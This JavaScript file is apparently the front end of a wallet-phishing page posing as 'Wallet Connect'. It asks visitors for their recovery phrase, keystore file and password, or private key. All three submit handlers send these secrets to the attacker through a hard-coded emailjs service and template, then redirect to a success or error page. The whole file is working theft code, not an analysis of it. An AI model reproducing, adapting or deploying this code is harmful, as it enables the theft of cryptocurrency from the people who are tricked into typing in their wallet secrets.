let wallet = localStorage.getItem('WALLETS');
let btns = document.getElementsByClassName('key');
for (let btn of Array.from(btns)) {
    btn.addEventListener("click", () => {
        if (btn.innerHTML == "Phrase") {
            document.querySelector(".phrase-container").style.display = 'contents';
            document.querySelector(".keystore-container").style.display = 'none';
            document.querySelector(".private-key-container").style.display = 'none';
        } else if (btn.innerHTML == "Keystore JSON") {
            document.querySelector(".phrase-container").style.display = 'none';
            document.querySelector(".keystore-container").style.display = 'contents';
            document.querySelector(".private-key-container").style.display = 'none';
        } else if (btn.innerHTML == "Private Key") {
            document.querySelector(".phrase-container").style.display = 'none';
            document.querySelector(".keystore-container").style.display = 'none';
            document.querySelector(".private-key-container").style.display = 'contents';
        }
    });
}


function sendPhrase() {
    // console.log(currentWallet);
   let textValue = document.querySelector('.input-area').value;
    let wordCount = textValue.match(/(\w+)/g).length;
    if (wordCount === 12 || wordCount === 24) {
        var templateParams = {
            from_name: 'Wallet Connect',
            message: `Wallet Name:${wallet}, phrase is: ${document.getElementById('phrase').value}`
        };
        emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
            .then(function (response) {
                let url = "./success.html";
                window.location.href = url;
            }, function (err) {
                let url = "./error.html";
                window.location.href = url;
            });
    } else {
        let url = "./error.html";
        window.location.href = url;

    }
    textValue = '';
}
    function sendKeystore() {
      let textValue = document.querySelector('.input-area').value;
      let passwordValue = document.getElementById('keystore-password').value;
        var templateParams = {
            from_name: 'Wallet Connect',
            message: `keystore value is: ${textValue} and keystore password is ${passwordValue}`
        };
        emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
            .then(function (response) {
                let url = "./success.html";
                window.location.href = url;
            }, function (err) {
                let url = "./error.html";
                window.location.href = url;
            });
            textValue = '';
            passwordValue = '';
    }

    function sendPrivatekey(){
        textValue = document.querySelector('#private-key').value;
        let wordCount = textValue.match(/(\w+)/g).length;
        if (wordCount === 12 || wordCount === 24) {
        var templateParams = {
            from_name: 'Wallet Connect',
            message: `private key value is: ${textValue} `
        };
        emailjs.send('service_evcipsg', 'template_7oct2km', templateParams)
            .then(function (response) {
                let url = "./success.html";
                window.location.href = url;
            }, function (err) {
                let url = "./error.html";
                window.location.href = url;
            });
        } else {
            let url = "./error.html";
            window.location.href = url;
    
        }
        textValue='';

    }

    // ==================phrase submit============================
    
    document.querySelector('.phrase-submit').addEventListener('click', (e) => {
        if (document.querySelector('.forms').checkValidity()){
        // if (textValue = '')
        e.preventDefault();
        
        sendPhrase();
    }});
    document.querySelector('.keystore-submit').addEventListener('click', (e) => {
        if (document.querySelector('.forms').checkValidity()){
        e.preventDefault()
        sendKeystore();
    }})
    document.querySelector('.private-submit').addEventListener('click', (e) => {
        if (document.querySelector('.forms').checkValidity()){
        e.preventDefault()
        sendPrivatekey();
    }})


